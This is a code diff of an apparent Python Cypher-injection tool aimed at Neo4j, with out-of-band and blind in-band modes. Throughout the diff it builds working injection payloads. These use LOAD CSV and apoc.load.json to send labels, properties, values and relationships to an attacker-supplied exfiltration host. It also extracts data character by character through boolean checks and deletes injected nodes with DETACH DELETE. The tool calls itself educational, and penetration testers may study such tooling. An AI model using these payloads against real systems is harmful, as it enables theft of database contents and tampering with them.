@@ -102,12 +102,7 @@ def fully_dynamic_convert_data(original_data):
 
     return converted_data
 
-def convert_dict_to_table(data):
-    """
-    Converts python dictionary to a table
-    - Adds an additional header called "ID"
-    """
-    
+def convert_dict_to_table(data):    
     if not data:
         return "The input data is empty."
     
@@ -126,8 +121,6 @@ def convert_dict_to_table(data):
     print(table)
 
 def write_json_to_file(json_data, filename="output.json"):
-    """Write JSON data to a file."""
-
     output_dir = os.path.join(os.getcwd(), "output")
     if not os.path.exists(output_dir):
         os.makedirs(output_dir)
@@ -135,6 +128,12 @@ def write_json_to_file(json_data, filename="output.json"):
     file_path = os.path.join(output_dir, filename)
     with open(file_path, 'w') as file:
         file.write(json.dumps(json_data, indent=2))
+
+def write_list_to_file(list_data):
+    with open("output/relationships.txt", 'w') as file:
+        for item in list_data:
+            file.write(f"{item}\n")
+
 
 def check_vulnerability(apoc_version):
     """
@@ -246,18 +245,24 @@ class oob_Neo4jInjector:
             print(colored(f"Error occurred: {e}", "red"))
         return None
 
-    # detects injection
     def detect_inject(self):
         animation = "|/-\\"
         anim_index = 0
         random.seed(time.strftime("%H:%M:%S", time.localtime()))
-        random_num = random.randint(0, 999)
+        self.random_num = random.randint(0, 999)
         csv_exfil = f"LOAD CSV FROM '{self.exfil_ip}/?data='+exfilData as l RETURN 1337 as x//"
         apoc_exfil = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//"
         csv = False
         apoc = False
         print("")
-        injection_characters = ["'", "\"", "'})", "\"})", f"{random_num}"]
+        # injection_characters = ["'", "\"", "'})", "\"})", f"{random_num}"]
+        injection_characters = [
+            f"{self.random_num}'",
+            f"{self.random_num}\"",
+            f"{self.random_num}')}}",
+            f"{self.random_num}\"}}",
+            f"{self.random_num}"
+        ]
         for injection_character in injection_characters:
             print(f"[{animation[anim_index % len(animation)]}] Checking injectability with LOAD CSV", end='\r', flush=True)
             anim_index += 1
@@ -350,117 +355,93 @@ class oob_Neo4jInjector:
         return labels
 
     
-    def dump_properties(self, label):
-        node_counts = []
-        # dump node count
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
-        node_count = get_data()  
-        node_counts.append(node_count)
-
-        # Dump property count
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as exfilData {self.exfil_payload}")
-
-        property_count = get_data()  
-
-        # dump properties
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
-
-        print(f"\n[*] Label: {label}")
-        print(f"[+] available properties [{property_count}]:")
-        properties = get_data().split('::')
-
-        for pr0perty in properties:
-            print(f"[++] {pr0perty}")
-
-        return properties
-
-    def dump_node_count(self, label):
-        node_counts = []
-        # dump node count
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
-        node_count = get_data()  
-        node_counts.append(node_count)
-        print(f"[{node_count} entries]")
-        return node_count
-
-    def dump_values(self, label, pr0perty):
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty}  WITH COLLECT(DISTINCT(id_{pr0perty})) AS list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
-        parsed_data = get_parsed_data()
-        # replace key name to pr0perty variable
-        parsed_data[pr0perty] =  parsed_data.pop("data")
-
-        return parsed_data
-        
-
-    def oob_dump_all(self):
-        labels = self.dump_labels()
+    def dump_properties(self, labels):
+        properties_dict = {}
         for label in labels:
-            properties = self.dump_properties(label)
-            properties_dict = {}
-            for pr0perty in properties:
-                parsed_data = self.dump_values(label, pr0perty)
-                properties_dict.update(parsed_data)
-            node_count = self.dump_node_count(label)
+            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
 
-            formatted_dict = fully_dynamic_convert_data(properties_dict)
+            print(f"\n[*] Label: {label}")
+            properties = get_data().split('::')
+            properties_dict[label] = properties
+            print(f"[+] available properties [{len(properties)}]:")
+
+            for pr0perty in properties:
+                print(f"[++] {pr0perty}")
+
+        return properties_dict
+
+    def dump_values(self, properties_dict):
+        for label, properties in properties_dict.items():
+            print(f"\n[*] Label: {label}")
+            print(f"[+] available properties [{len(properties)}]")
+            values_dict = {}
+            for pr0perty in properties:
+                self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty}  WITH COLLECT(DISTINCT(id_{pr0perty})) AS list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
+                parsed_data = get_parsed_data()
+                parsed_data[pr0perty] =  parsed_data.pop("data")
+                values_dict.update(parsed_data)
+                print(f"[++] {pr0perty}") 
+            formatted_dict = fully_dynamic_convert_data(values_dict)
             write_json_to_file(formatted_dict, f'{label}.json')
             convert_dict_to_table(formatted_dict)
 
-    def exfil_relationship(self):
+        return 
+        
+    def dump_rels(self):
+        print(colored("\n[*] exfiltrating relationships", "yellow"))
+        # dump relationship types
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
 
-        print("\n[*] Exfiltrating Relationships")
-        # dump relationship count
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COUNT(DISTINCT(type(relationship))) as exfilData {self.exfil_payload}")
-
-        rel_type_counts = get_data()  
-
-        if rel_type_counts is None or rel_type_counts == '0':
+        rel_types = get_data()
+        if rel_types is None:
             print(colored("[!] WARNING, The database might not have any relationships. Exiting...", "red"))
             sys.exit()
 
-        # dump relationships type
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
-
-        
-        print(f"\n[*] relationships types [{rel_type_counts}]:")
-        relationships = get_data().split('::')
-        for relationship in relationships:
-            print(f"[+] {relationship}")
+        rel_types = rel_types.split('::')
+        print(f"\n[*] relationships types [{len(rel_types)}]:")
+        for rel_type in rel_types:
+            print(f"[+] {rel_type}")
 
         # dump relationships
-        found_relationships = []
+        verfied_rels = []
         counter = 0 
-        for rel_type in relationships:
+        for rel_type in rel_types:
             # Initial payload injection to get relationships list
             self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 WITH toString(id(node1)) + ':{rel_type}:' + toString(id(node2)) as rows WITH COLLECT(rows) AS list WITH REDUCE(mergedString = '', value IN list | mergedString+value+'::') AS exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
             
-            relationships_list = get_data().split('::')
+            rels = get_data().split('::')
 
-            for relationship in relationships_list:
-                relationship_parts = relationship.split(':')
-                id1, rel_type, id2 = relationship_parts[0], relationship_parts[1], relationship_parts[2]
+            for rel in rels:
+                rel_parts = rel.split(':')
+                id1, rel_type, id2 = rel_parts[0], rel_parts[1], rel_parts[2]
                 # verify relationship
                 # process each relationship direction
                 for id_from, id_to in [(id1, id2), (id2, id1)]:
                     self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WHERE id(node1) = {id_from} and id(node2) = {id_to} WITH DISTINCT node1, node2  UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + ':' + id(node1) + '-[:{rel_type}]-%3E' + label2 + ':' + id(node2) as exfilData {self.exfil_payload}")
                     if not data_queue.empty():
                         counter += 1
-                        relationship = get_data()
-                        found_relationships.append(relationship)
+                        rel = get_data()
+                        verfied_rels.append(rel)
             
+        write_list_to_file(verfied_rels)
+
         print(f"\n[*] available relationships [{counter}]")
-        for rel_type in relationships:
+        for rel_type in rel_types:
             print(f"[+] {rel_type}")
-            for relationship in found_relationships:
-                regex_rel_type = re.findall(r"\[:([^\]]+)\]", relationship)[0]
+            for rel in verfied_rels:
+                regex_rel_type = re.findall(r"\[:([^\]]+)\]", rel)[0]
                 if regex_rel_type == rel_type:
-                    print(f"[++] {relationship}")
-
-
+                    print(f"[++] {rel}")
 
     def clean_up(self):
         # fix this
-        self.inject_payload(" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [1337, '1337']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [{self.random_num}, '{self.random_num}']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")
+
+    def oob_dump_all(self):
+        labels = self.dump_labels()
+        properties_dict = self.dump_properties(labels)
+        values_dict = self.dump_values(properties_dict)
+
 
 
 class ib_Neo4jInjector:
@@ -597,7 +578,7 @@ class ib_Neo4jInjector:
             anim_index += 1
             for response in responses:
                 if (self.check_true(response)):
-                    print(" " * 50, end='\r')
+                    print(" " * 150, end='\r')
                     return count_index
 
     def find_label_sizes(self, label_count):
@@ -617,7 +598,7 @@ class ib_Neo4jInjector:
                         break
                 if (break_flag):
                     break
-        print(" " * 50, end='\r')
+        print(" " * 150, end='\r')
         return label_sizes_dict
 
     def dump_labels(self, label_sizes):
@@ -641,7 +622,7 @@ class ib_Neo4jInjector:
                             break
                     if (break_flag):
                         break
-            print(" " * 50, end='\r')
+            print(" " * 150, end='\r')
             print(f"[+] {label}")
             labels.append(label)
         return labels
@@ -664,7 +645,7 @@ class ib_Neo4jInjector:
                         break
                 if (break_flag):
                     break
-        print(" " * 70, end='\r')
+        print(" " * 150, end='\r')
         return property_counts_dict
 
     def find_property_sizes(self, property_counts_dict):
@@ -689,7 +670,7 @@ class ib_Neo4jInjector:
                                 break  # Stop searching after finding the blind string for this property
                     if (break_flag):
                         break
-        print(" " * 70, end='\r')
+        print(" " * 150, end='\r')
         return property_sizes_dict
 
 
@@ -716,7 +697,7 @@ class ib_Neo4jInjector:
                                     break 
                         if (break_flag):
                             break
-                print(" " * 50, end='\r') 
+                print(" " * 150, end='\r') 
                 print(f"[++] {pr0perty}")
                 if label in properties_dict:
                     properties_dict[label].append(pr0perty)
@@ -724,7 +705,7 @@ class ib_Neo4jInjector:
                     properties_dict[label] = [pr0perty]
         return properties_dict
 
-    def find_value_count(self, properties_dict):
+    def find_value_counts(self, properties_dict):
         value_counts_dict = {}
         animation = "|/-\\"
         anim_index = 0
@@ -746,11 +727,11 @@ class ib_Neo4jInjector:
                             break  # Stop searching after finding the blind string for this property
                     if (break_flag):
                         break
-        print(" " * 70, end='\r')       
+        print(" " * 150, end='\r')       
         return value_counts_dict
 
 
-    def find_value_size(self, value_counts_dict):
+    def find_value_sizes(self, value_counts_dict):
         value_sizes_dict = {}
         animation = "|/-\\"
         anim_index = 0
@@ -758,10 +739,10 @@ class ib_Neo4jInjector:
             value_sizes_dict[label] = {}
             for pr0perty, count in properties_dict.items():
                 value_sizes_dict[label][pr0perty] = {}
-                for count_index in range(count):  # Assuming 'size' here actually meant 'count' in your initial approach
+                for count_index in range(count): 
                     break_flag = False
-                    for size_index in range(1000):  # Assuming 'n' is the size you're looking to determine
-                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(x.{pr0perty}) as list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
+                    for size_index in range(1000):  
+                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(toString(id(x)) + '::' + x.{pr0perty}) as list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
                         print(f"[{animation[anim_index % len(animation)]}] dumping value counts, might take awhile", end='\r', flush=True)
                         anim_index += 1
                         for response in responses:
@@ -772,10 +753,10 @@ class ib_Neo4jInjector:
                                 break  # Found the size for this occurrence, no need to continue
                         if (break_flag):
                             break
-        print(" " * 70, end='\r')
+        print(" " * 150, end='\r')
         return value_sizes_dict
 
-    def dump_value(self, value_sizes_dict):
+    def dump_values(self, value_sizes_dict):
         valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
         values_dict = {}
         animation = "|/-\\"
@@ -798,7 +779,7 @@ class ib_Neo4jInjector:
                     for size_index in range(size):
                         break_flag = False
                         for char in valid_chars:
-                            responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(x.{pr0perty}) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+                            responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(toString(id(x)) + '::' + x.{pr0perty}) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
                             print(f"[{animation[anim_index % len(animation)]}] building value: {value}{char}", end='\r', flush=True)
                             anim_index += 1
                             for response in responses:
@@ -808,43 +789,40 @@ class ib_Neo4jInjector:
                                     break  # Found the size for this occurrence, no need to continue
                             if (break_flag):
                                 break
-                    print(" " * 50, end='\r') 
-                    print(f"[+++] {value}")
+                    print(" " * 150, end='\r') 
+                    print(f"[+++] {''.join(value.split('::')[1::])}")
 
                     values_dict[label][pr0perty][count_index] = value
-                    
+
+        # convert to json format and display as table
         for label, properties in values_dict.items():
             print(f"\n[*] Label: {label}")
             property_names = list(properties.keys())
             print(f"[+] available properties [{len(property_names)}]:")
             for prop in property_names:
                 print(f"[++] {prop}")
-            print(f"[{len(next(iter(properties.values())).items())} entries]")
             
-            entries_count = max(len(v) for v in properties.values())
+            ids_and_values = {}
+            for prop, id_value_dict in properties.items():
+                for id_key, value in id_value_dict.items():
+                    id_str, actual_value = value.split('::', 1)
+                    if id_str not in ids_and_values:
+                        ids_and_values[id_str] = {}
+                    ids_and_values[id_str][prop] = actual_value
 
-            rows = []
-            for i in range(entries_count):
-                row = [properties[prop].get(i, '') for prop in property_names]
-                rows.append(row)
+            json_output = {}
+            for id_str, values in ids_and_values.items():
+                # Initialize a dictionary for the current ID if not already present
+                if id_str not in json_output:
+                    json_output[id_str] = {}
+                for prop in property_names:
+                    # Assign the property value or None if the property does not exist for the current ID
+                    json_output[id_str][prop] = values.get(prop, None)
 
-            print(tabulate(rows, headers=[prop for prop in property_names], tablefmt="grid"))
-        return values_dict
+            write_json_to_file(json_output, f'{label}.json')
+            convert_dict_to_table(json_output)
 
-
-    def ib_dump_all(self):
-        print(colored("[!] WARNING, This will take a long time.", "red"))
-        label_count = self.find_label_count()
-        label_sizes_dict = self.find_label_sizes(label_count)
-        labels = self.dump_labels(label_sizes_dict)
-
-        property_counts_dict = self.find_property_counts(labels)
-        property_sizes_dict = self.find_property_sizes(property_counts_dict)
-        properties_dict = self.dump_properties(property_sizes_dict)
-
-        value_counts_dict = self.find_value_count(properties_dict)
-        value_sizes_dict = self.find_value_size(value_counts_dict)
-        values = self.dump_value(value_sizes_dict)
+        return(values_dict)
 
     def find_rel_type_counts(self):
         animation = "|/-\\"
@@ -914,7 +892,7 @@ class ib_Neo4jInjector:
         for rel_type in rel_types:
             break_flag = False
             for count_index in range(1000):
-                responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 RETURN label1 + ':' + toString(id(node1)) + ':{rel_type}:' + label2 + ':' + toString(id(node2))}} = {count_index}"))
+                responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 RETURN label1 + '::' + toString(id(node1)) + '::{rel_type}::' + label2 + '::' + toString(id(node2))}} = {count_index}"))
                 print(f"[{animation[anim_index % len(animation)]}] dumping id to id relationship counts, might take awhile", end='\r', flush=True)
                 anim_index += 1
                 for response in responses:
@@ -936,7 +914,7 @@ class ib_Neo4jInjector:
                 break_flag = False 
                 for size_index in range(1000):
                     # Construct and send your query
-                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + ':' + toString(id(node1)) + ':{rel_type}:' + label2 + ':' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
+                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + '::' + toString(id(node1)) + '::{rel_type}::' + label2 + '::' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
                     print(f"[{animation[anim_index % len(animation)]}] dumping relationship sizes, might take awhile", end='\r', flush=True)
                     anim_index += 1
                     for response in responses:
@@ -944,9 +922,8 @@ class ib_Neo4jInjector:
                         if (break_flag):
                                 if rel_type not in rel_sizes_dict:
                                     rel_sizes_dict[rel_type] = {}
-                                # Now that we're sure label exists in value_counts, record the count
                                 rel_sizes_dict[rel_type][count_index] = size_index
-                                break  # Stop searching after finding the blind string for this property
+                                break  
                     if (break_flag):
                         break
         print(" " * 150, end='\r')
@@ -959,14 +936,13 @@ class ib_Neo4jInjector:
         animation = "|/-\\"
         anim_index = 0
         for rel_type, size_dict in rel_sizes_dict.items():
-            print(f"[*] available relationship [{len(size_dict)}]:")
             print(f"[+] relationship: {rel_type}")
             for count_index, size in size_dict.items():
                 rel = ''
                 for size_index in range(size):
                     break_flag = False
                     for char in valid_chars:
-                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + ':' + toString(id(node1)) + ':{rel_type}:' + label2 + ':' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + '::' + toString(id(node1)) + '::{rel_type}::' + label2 + '::' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
                         print(f"[{animation[anim_index % len(animation)]}] building relationship: {rel}{char}", end='\r', flush=True)
                         anim_index += 1
                         for response in responses:
@@ -986,7 +962,7 @@ class ib_Neo4jInjector:
         anim_index = 0
         verified_rels = []
         for rel_type, rel in rels_dict.items():
-            rel_parts = rel.split(':')
+            rel_parts = rel.split('::')
             label1, id1, rel_type, label2, id2 = rel_parts[0], rel_parts[1], rel_parts[2], rel_parts[3], rel_parts[4]
             break_flag = False
             for id_from, id_to in [(id1, id2), (id2, id1)]:
@@ -1000,10 +976,11 @@ class ib_Neo4jInjector:
                             break 
                 if (break_flag):
                     break
-                print(" " * 150, end='\r') 
+                
+        print(" " * 150, end='\r')
+        write_list_to_file(found_relationships)
 
         print(f"\n[*] available relationships [{len(verified_rels)}]")
-        
         for rel_type in rels_dict.keys():
             print(f"[+] {rel_type}")
             for rel in verified_rels:
@@ -1013,7 +990,7 @@ class ib_Neo4jInjector:
 
         return verified_rels
 
-    def ib_dump_rel_types(self):
+    def dump_rels(self):
         rel_type_counts = self.find_rel_type_counts()
         rel_type_sizes_dict = self.find_rel_type_sizes(rel_type_counts)
         rel_types  = self.dump_rel_types(rel_type_sizes_dict)
@@ -1021,7 +998,19 @@ class ib_Neo4jInjector:
         rel_sizes_dict = self.find_rel_sizes(rel_counts_dict)
         rels = self.dump_rel(rel_sizes_dict)
         verified_rels = self.verify_rels(rels)
-        
+
+    def ib_dump_all(self):
+        print(colored("[!] WARNING, This will take a long time.", "red"))
+        label_count = self.find_label_count()
+        label_sizes_dict = self.find_label_sizes(label_count)
+        labels = self.dump_labels(label_sizes_dict)
+        property_counts_dict = self.find_property_counts(labels)
+        property_sizes_dict = self.find_property_sizes(property_counts_dict)
+        properties_dict = self.dump_properties(property_sizes_dict)
+        value_counts_dict = self.find_value_counts(properties_dict)
+        value_sizes_dict = self.find_value_sizes(value_counts_dict)
+        values = self.dump_values(value_sizes_dict)
+
 
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
@@ -1092,30 +1081,33 @@ def main():
                 return
 
         injector.get_version()
-            
+        
         if args.dump_all:
             injector.oob_dump_all()
-            injector.exfil_relationship()
+            injector.dump_rels()
 
         elif args.labels:
             labels = injector.dump_labels()
         
-        elif args.properties:
-            properties, node_count = injector.dump_properties(args.label)
+        elif args.label and args.properties:
+            labels = args.label.split(',')
+            properties_dict = injector.dump_properties(labels)
+            print(properties_dict)
 
-        elif args.property:
-            properties = args.property.split(",")
+        elif args.label and args.property:
             properties_dict = {}
-            for pr0perty in properties:
-                parsed_data = injector.dump_values(args.label, pr0perty)
-                properties_dict.update(parsed_data)
-            node_count = injector.dump_node_count(args.label)
-            formatted_dict = fully_dynamic_convert_data(properties_dict)
-            write_json_to_file(formatted_dict, f'{args.label}.json')
-            convert_dict_to_table(formatted_dict)
+            labels = args.label.split(',')
+            properties = args.property.split(',')
+            for label in labels:
+                for pr0perty in properties:
+                    if label in properties_dict:
+                        properties_dict[label].append(pr0perty)
+                    else:
+                        properties_dict[label] = [pr0perty]
+            injector.dump_values(properties_dict)
 
-        if not (args.relationships and args.dump_all):
-            injector.exfil_relationship()
+        elif args.relationships:
+            injector.dump_rels()
 
         injector.clean_up()
         listener.stop_listener()
@@ -1138,19 +1130,20 @@ def main():
 
         if args.dump_all:
             injector.ib_dump_all()
+            injector.dump_rels()
 
-        if args.labels:
+        elif args.labels:
             label_count = injector.find_label_count()
             label_sizes_dict = injector.find_label_sizes(label_count)
             labels = injector.dump_labels(label_sizes_dict)
 
-        if args.label and args.properties:
+        elif args.label and args.properties:
             labels = args.label.split(',')
             property_counts_dict = injector.find_property_counts(labels)
             property_sizes_dict = injector.find_property_sizes(property_counts_dict)
             properties_dict = injector.dump_properties(property_sizes_dict)
 
-        if args.label and args.property:
+        elif args.label and args.property:
             properties_dict = {}
             labels = args.label.split(',')
             properties = args.property.split(',')
@@ -1160,13 +1153,13 @@ def main():
                         properties_dict[label].append(pr0perty)
                     else:
                         properties_dict[label] = [pr0perty]
-            value_counts_dict = injector.find_value_count(properties_dict)
-            value_sizes_dict = injector.find_value_size(value_counts_dict)
-            values = injector.dump_value(value_sizes_dict)
-        injector.ib_dump_rel_types()
+            value_counts_dict = injector.find_value_counts(properties_dict)
+            value_sizes_dict = injector.find_value_sizes(value_counts_dict)
+            values = injector.dump_values(value_sizes_dict)
+        
+        elif args.relationships:
+            injector.dump_rels()
 
-        if args.relationships:
-            injector.exfil_relationship()
     else:
         print(colored("Choose: [--in-band/--out-of-band]", "red"))
 
